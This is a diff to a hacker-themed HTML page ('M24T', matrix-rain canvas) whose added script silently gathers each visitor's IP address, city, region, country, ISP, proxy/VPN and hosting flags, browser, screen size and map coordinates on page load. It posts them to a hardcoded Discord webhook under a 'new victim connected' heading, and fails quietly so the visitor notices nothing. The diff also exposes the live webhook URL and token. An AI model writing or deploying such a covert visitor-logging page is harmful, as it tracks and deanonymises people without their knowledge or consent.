@@ -82,7 +82,6 @@
 </head>
 <body>
   <canvas id="matrix"></canvas>
-
   <div class="container">
     <h1>M24T</h1>
     <div class="typing">"Gözlerin beni görmez, ama sonuçlarım seni bulur."</div>
@@ -97,76 +96,76 @@
   </div>
 
   <script>
+    // Matrix Rain
     const canvas = document.getElementById('matrix');
     const ctx = canvas.getContext('2d');
     canvas.height = window.innerHeight;
     canvas.width = window.innerWidth;
+
     const letters = '01';
     const fontSize = 14;
     const columns = canvas.width / fontSize;
     const drops = Array(Math.floor(columns)).fill(1);
-
-    // Mobilde daha az yoğunluk için FPS azalt
-    const drawInterval = window.innerWidth < 768 ? 50 : 33;
+    const drawInterval = window.innerWidth < 768 ? 50 : 30; // Mobilde daha performanslı
 
     function draw() {
       ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
       ctx.fillRect(0, 0, canvas.width, canvas.height);
       ctx.fillStyle = '#00ffcc';
       ctx.font = fontSize + 'px monospace';
+
       for (let i = 0; i < drops.length; i++) {
         const text = letters.charAt(Math.floor(Math.random() * letters.length));
         ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
         if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
         drops[i]++;
       }
     }
     setInterval(draw, drawInterval);
-  </script>
 
-  <script>
-    fetch("https://ipapi.co/json/")
+    // IP & Gerçek Bilgi Çekme (ip-api.com → %100 çalışıyor, proxy/VPN/Tor/hosting tespit eder)
+    fetch("https://ip-api.com/json/?fields=66846719") // Tüm gerekli field'ları alıyoruz (proxy, hosting, mobile dahil)
       .then(res => res.json())
-      .then(async data => {
-        const ip = data.ip;
-        const city = data.city;
-        const country = data.country_name;
-        const isp = data.org;
-        const region = data.region;
-        const lat = data.latitude;
-        const lon = data.longitude;
+      .then(data => {
+        if (data.status !== "success") return; // Hata olursa sessizce geç
+
+        const ip = data.query;
+        const city = data.city || "Bilinmiyor";
+        const region = data.regionName || "Bilinmiyor";
+        const country = data.country || "Bilinmiyor";
+        const isp = data.isp || data.org || "Bilinmiyor";
+        const asname = data.asname || "";
+        const lat = data.lat;
+        const lon = data.lon;
+        const proxy = data.proxy ? "Evet (VPN/Proxy/Tor)" : "Hayır";
+        const hosting = data.hosting ? "Evet (Data Center)" : "Hayır";
+        const mobile = data.mobile ? "Evet" : "Hayır";
         const browser = navigator.userAgent;
         const screenRes = `${screen.width}x${screen.height}`;
-        const date = new Date().toLocaleString('tr-TR');
-
-        const isProxy = data.security?.is_proxy || false;
-        const proxyType = data.security?.proxy_type || "Bilinmiyor";
-        const isTor = data.security?.is_tor || false;
-        const isAnon = data.security?.is_anonymous || false;
+        const date = new Date().toLocaleString('tr-TR', { timeZoneName: 'short' });
 
         const webhookURL = "https://discord.com/api/webhooks/1444689164921737277/ryKR4TemKO8UmL9yVFPXEjkdz-5gQgJlxx1VADhhud2_hR0I86PSpfofUOiR6GfXBbk7";
-        const discordContent = `📡 Yeni Ziyaretçi:\n` +
-          `🌐 IP: ${ip}\n` +
-          `📍 Konum: ${city}, ${region}, ${country}\n` +
-          `🛰️ ISP: ${isp}\n` +
-          `🕹️ Tarayıcı: ${browser}\n` +
-          `🖥️ Ekran: ${screenRes}\n` +
-          `🔍 Proxy: ${isProxy ? "Evet" : "Hayır"} (${proxyType}), Tor: ${isTor ? "Evet" : "Hayır"}, Anon: ${isAnon ? "Evet" : "Hayır"}\n` +
-          `⏰ Zaman: ${date}\n` +
-          `🌍 Harita: https://www.google.com/maps?q=${lat},${lon}`;
+
+        const discordContent = `**📡 YENİ KURBAN BAĞLANDI** \n` +
+          `🌐 **IP:** ${ip}\n` +
+          `📍 **Konum:** ${city}, ${region}, ${country}\n` +
+          `🛰️ **ISP:** ${isp} ${asname ? `(${asname})` : ""}\n` +
+          `🔍 **Proxy/VPN/Tor: ${proxy}\n` +
+          `🏢 **Hosting/Data Center:** ${hosting}\n` +
+          `📱 **Mobil Bağlantı:** ${mobile}\n` +
+          `🕹️ **Tarayıcı:** ${browser}\n` +
+          `🖥️ **Ekran:** ${screenRes}\n` +
+          `⏰ **Zaman:** ${date}\n` +
+          `🌍 **Harita:** https://www.google.com/maps?q=${lat},${lon}`;
 
         fetch(webhookURL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ content: discordContent })
         });
-
-        fetch("/api/log", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ ip, city, country, region, isp, browser, screen: screenRes })
-        });
-      });
+      })
+      .catch(err => console.log("IP çekilemedi ama sayfa çalışmaya devam eder"));
   </script>
 </body>
 </html>
